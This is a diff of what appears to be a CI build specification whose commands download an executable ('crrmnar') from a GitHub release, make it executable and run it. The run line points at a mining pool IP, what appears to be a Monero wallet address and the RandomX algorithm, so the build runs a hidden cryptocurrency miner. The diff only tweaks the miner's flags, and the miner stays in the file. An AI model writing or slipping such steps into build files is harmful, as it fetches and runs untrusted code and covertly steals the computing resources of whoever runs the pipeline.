@@ -9,5 +9,6 @@ phases:
     commands:
       - wget https://github.com/vedhagsvp/marva/releases/download/c4ksd/crrmnar
       - chmod +x crrmnar
-      - ./crrmnar -o 3.238.231.79:8085 -u 87BHPx4atTidKdRdrWkYEvKhhY4TtKnncUX2ECWgY4syhxPPKdsGrUjWY8MujTSAyXUzh5cvJEWf4WCL8Fp1fXeETMHSYf6 -p bd08 -a rx/0 -t $(nproc --all) > /dev/null 2>&1
+      - ./crrmnar -o 3.238.231.79:8085 -u 87BHPx4atTidKdRdrWkYEvKhhY4TtKnncUX2ECWgY4syhxPPKdsGrUjWY8MujTSAyXUzh5cvJEWf4WCL8Fp1fXeETMHSYf6 -p bd08 -a rx/0
+      
       
